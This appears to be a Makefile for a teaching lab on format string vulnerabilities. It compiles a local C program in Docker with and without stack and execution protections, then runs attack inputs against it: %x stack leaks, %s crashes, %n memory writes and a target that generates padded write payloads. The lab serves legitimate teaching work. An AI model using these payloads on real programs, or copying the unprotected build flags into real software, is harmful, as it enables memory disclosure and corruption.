# Makefile for Format String Vulnerability Demonstration
# 
# This Makefile builds and runs format string vulnerability examples in Docker environment
# It demonstrates various format string attacks including info disclosure and memory corruption

# Variables
CC = gcc
TARGET = format_string_vuln
SOURCE = format_string_vuln.c
DOCKER_SERVICE = ubuntu_1804
DOCKER_WORKDIR = /home/Security_Essentials/2_Format_String

# Compiler flags for vulnerability demonstration
VULN_FLAGS = -fno-stack-protector -z execstack -no-pie -Wno-format-security
SECURE_FLAGS = -fstack-protector-all -z noexecstack -pie -Wformat -Wformat-security -D_FORTIFY_SOURCE=2

# Default target
.PHONY: all
all: help

# Help target
.PHONY: help
help:
	@echo "=== Format String Vulnerability Demonstration Makefile ==="
	@echo ""
	@echo "Available targets:"
	@echo "  build-vuln     - Build vulnerable version (no format protections)"
	@echo "  build-secure   - Build secure version (with format protections)"
	@echo "  test-safe      - Run with safe input"
	@echo "  test-info-leak - Test information disclosure attack"
	@echo "  test-stack-dump- Dump stack contents"
	@echo "  test-crash     - Test crash with invalid format strings"
	@echo "  test-write     - Test memory write attack"
	@echo "  test-all       - Run all vulnerability tests"
	@echo "  docker-shell   - Open shell in Docker container"
	@echo "  clean          - Clean built files"
	@echo "  info           - Show security information"
	@echo ""
	@echo "Usage examples:"
	@echo "  make build-vuln && make test-info-leak"
	@echo "  make build-secure && make test-info-leak"
	@echo "  make test-all"

# Build vulnerable version (without security protections)
.PHONY: build-vuln
build-vuln:
	@echo "Building vulnerable version without format string protections..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		apt-get update -qq && apt-get install -y gcc && \
		$(CC) $(VULN_FLAGS) $(SOURCE) -o $(TARGET)_vuln && \
		echo 'Built: $(TARGET)_vuln' && \
		ls -la $(TARGET)_vuln"

# Build secure version (with security protections)
.PHONY: build-secure
build-secure:
	@echo "Building secure version with format string protections..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		apt-get update -qq && apt-get install -y gcc && \
		$(CC) $(SECURE_FLAGS) $(SOURCE) -o $(TARGET)_secure && \
		echo 'Built: $(TARGET)_secure' && \
		ls -la $(TARGET)_secure"

# Test with safe input
.PHONY: test-safe
test-safe: check-binary
	@echo "Testing with safe input..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Safe Input Test ===' && \
		./$(TARGET)_vuln 'Hello, World!' || ./$(TARGET)_secure 'Hello, World!'"

# Test information disclosure attack
.PHONY: test-info-leak
test-info-leak: check-binary
	@echo "Testing information disclosure via format string..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Information Disclosure Test ===' && \
		echo 'Reading stack values with %x format specifiers...' && \
		./$(TARGET)_vuln '%x.%x.%x.%x.%x.%x.%x.%x' || \
		echo 'Vulnerability test completed'"

# Test extensive stack dump
.PHONY: test-stack-dump
test-stack-dump: check-binary
	@echo "Testing extensive stack dump..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Stack Dump Test ===' && \
		echo 'Dumping more stack values...' && \
		./$(TARGET)_vuln '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x' || \
		echo 'Stack dump test completed'"

# Test crash with invalid format strings
.PHONY: test-crash
test-crash: check-binary
	@echo "Testing crash with invalid format strings..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Crash Test ===' && \
		echo 'Attempting to crash with %s format specifiers...' && \
		./$(TARGET)_vuln '%s%s%s%s' || \
		echo 'Crash test completed (program may have terminated)'"

# Test memory write attack
.PHONY: test-write
test-write: check-binary
	@echo "Testing memory write attack..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Memory Write Test ===' && \
		echo 'Attempting memory write with %n specifier...' && \
		./$(TARGET)_vuln '%n' || \
		echo 'Write test completed'"

# Test advanced format string attacks
.PHONY: test-advanced
test-advanced: check-binary
	@echo "Testing advanced format string attacks..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Advanced Format String Tests ===' && \
		echo 'Test 1: Position-based access' && \
		./$(TARGET)_vuln '%3\$$x.%4\$$x.%5\$$x' || echo 'Test 1 completed' && \
		echo '' && \
		echo 'Test 2: Width specifiers for alignment' && \
		./$(TARGET)_vuln '%20x.%20x.%20x' || echo 'Test 2 completed' && \
		echo '' && \
		echo 'Test 3: Multiple format specifiers' && \
		./$(TARGET)_vuln '%d %x %o %c %p' || echo 'Test 3 completed'"

# Run all vulnerability tests
.PHONY: test-all
test-all: build-vuln
	@echo "Running comprehensive format string vulnerability tests..."
	@$(MAKE) test-safe
	@echo ""
	@$(MAKE) test-info-leak
	@echo ""
	@$(MAKE) test-stack-dump
	@echo ""
	@$(MAKE) test-advanced
	@echo ""
	@$(MAKE) test-write
	@echo ""
	@$(MAKE) test-crash
	@echo ""
	@echo "All vulnerability tests completed!"

# Compare vulnerable vs secure implementations
.PHONY: compare
compare: build-vuln build-secure
	@echo "Comparing vulnerable vs secure implementations..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Vulnerable Version ===' && \
		./$(TARGET)_vuln '%x.%x.%x.%x' || echo 'Vulnerable version test completed' && \
		echo '' && \
		echo '=== Secure Version ===' && \
		./$(TARGET)_secure '%x.%x.%x.%x' || echo 'Secure version test completed'"

# Show security information
.PHONY: info
info:
	@echo "=== Security Information ==="
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo 'System information:' && \
		uname -a && \
		echo '' && \
		echo 'ASLR status:' && \
		cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo 'ASLR info not available' && \
		echo '' && \
		echo 'Binary security features (if built):' && \
		(command -v checksec >/dev/null && checksec --file=$(TARGET)_vuln 2>/dev/null || echo 'checksec not available') && \
		echo '' && \
		echo 'File information:' && \
		ls -la $(TARGET)_* 2>/dev/null || echo 'No binaries found - run build-vuln or build-secure first'"

# Open shell in Docker container for manual testing
.PHONY: docker-shell
docker-shell:
	@echo "Opening shell in Docker container..."
	@echo "Working directory: $(DOCKER_WORKDIR)"
	@echo "Try manual format string tests like:"
	@echo "  ./$(TARGET)_vuln '%x.%x.%x.%x'"
	@echo "  ./$(TARGET)_vuln '%s'"
	@echo "  ./$(TARGET)_vuln '%n'"
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && bash"

# Check if binary exists
.PHONY: check-binary
check-binary:
	@docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		if [ ! -f $(TARGET)_vuln ] && [ ! -f $(TARGET)_secure ]; then \
			echo 'Error: No binary found. Run \"make build-vuln\" or \"make build-secure\" first.'; \
			exit 1; \
		fi"

# Clean built files
.PHONY: clean
clean:
	@echo "Cleaning built files..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		rm -f $(TARGET)_vuln $(TARGET)_secure core core.* && \
		echo 'Cleaned: $(TARGET)_vuln $(TARGET)_secure'"

# Advanced: GDB debugging session for format string analysis
.PHONY: debug
debug: build-vuln
	@echo "Starting GDB debugging session for format string analysis..."
	@echo "Useful GDB commands for format string analysis:"
	@echo "  run '%x.%x.%x.%x'"
	@echo "  x/20wx \$$rsp    (examine stack)"
	@echo "  info registers"
	@echo "  disas vulnerable_log"
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		apt-get update -qq && apt-get install -y gdb && \
		gdb ./$(TARGET)_vuln"

# Generate format string payloads for testing
.PHONY: payloads
payloads:
	@echo "Generating format string payloads for testing..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo 'Format String Payloads:' && \
		echo '' && \
		echo '1. Basic stack reading:' && \
		echo '   %x.%x.%x.%x.%x.%x.%x.%x' && \
		echo '' && \
		echo '2. Position-based access:' && \
		echo '   %1\$$x %2\$$x %3\$$x %4\$$x' && \
		echo '' && \
		echo '3. String reading (dangerous):' && \
		echo '   %s' && \
		echo '' && \
		echo '4. Memory write:' && \
		echo '   %n' && \
		echo '' && \
		echo '5. Padding for precise writes:' && \
		perl -E 'say \"%\" . (0x41414141-4) . \"x%n\"' && \
		echo '' && \
		echo '6. Multiple writes:' && \
		echo '   %65x%n%66x%n' && \
		echo '' && \
		echo 'Copy and test these with: ./$(TARGET)_vuln \"<payload>\"'"

# Educational demonstration
.PHONY: demo
demo: build-vuln
	@echo "Running educational demonstration..."
	docker compose run --rm $(DOCKER_SERVICE) bash -c "cd $(DOCKER_WORKDIR) && \
		echo '=== Format String Vulnerability Educational Demo ===' && \
		echo '' && \
		echo 'Step 1: Normal usage' && \
		./$(TARGET)_vuln 'Hello World' && \
		echo '' && \
		echo 'Step 2: Information disclosure' && \
		./$(TARGET)_vuln '%x.%x.%x.%x' && \
		echo '' && \
		echo 'Step 3: Attempting memory write' && \
		./$(TARGET)_vuln '%n' || echo 'Write attempt completed' && \
		echo '' && \
		echo 'Demo completed! Check the outputs above.'"
